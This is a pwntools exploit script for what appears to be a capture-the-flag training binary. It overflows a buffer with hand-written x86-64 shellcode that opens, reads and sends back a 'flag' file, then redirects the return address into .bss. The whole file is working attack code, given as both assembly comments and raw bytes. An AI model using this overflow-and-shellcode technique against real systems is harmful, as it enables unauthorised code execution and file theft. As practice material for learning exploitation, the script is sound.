from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2006)

r = process("./shellcode") 

''' not attaching to remote
b * 0x4011d4  b * 0x401251	

gdb.attach(r, """
	c        
""")
'''

print(r.clean())

input("wait")

''' open flag file, read it into memory and write it to clients output
jmp flagfile  #jump and call to get the "flag" address
readflag:
pop rdi
mov rax, 0x02 #open
mov rsi, 0    #flag=read
xor rdx, rdx  #mode, not important
syscall       #open file for reading, returns fd in rax

mov r9, rax   #move returned fd to r9
add r9, -4    #by repetition, fd-4 gives us the clients fd (cannot use dup, so had to try one by one)
mov rdi, rax  #move returned fd to rdi
mov rax, 0x00 #read
mov rsi, 0x404ffb  #address of buffer in bss to read into
mov rdx, 100  #read 100 bytes
syscall       #read flag content into bss buffer

mov rax, 0x01 #write
mov rdi, r9   #write clients fd
mov rsi, 0x404ffb  #address of buffer in bss with data
mov rdx, 100  #write 100 bytes
syscall

flagfile:
call readflag
#nop # "flag\0"
'''
readwritecode = b"\xEB\x4F\x5F\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\x31\xD2\x0F\x05\x49\x89\xC1\x49\x83\xC1\xFC\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC6\xFB\x4F\x40\x00\x48\xC7\xC2\x64\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x4C\x89\xCF\x48\xC7\xC6\xFB\x4F\x40\x00\x48\xC7\xC2\x64\x00\x00\x00\x0F\x05\xE8\xAC\xFF\xFF\xFF"

readwritecode = readwritecode + b"flag\0"

#Address where readwritecode is to be written
bss_address = b"\xc0\x40\x40\x00\x00\x00\x00\x00"

overflow = readwritecode.ljust(1016, b"A") + bss_address

r.send(overflow)

print(r.clean())

r.interactive()

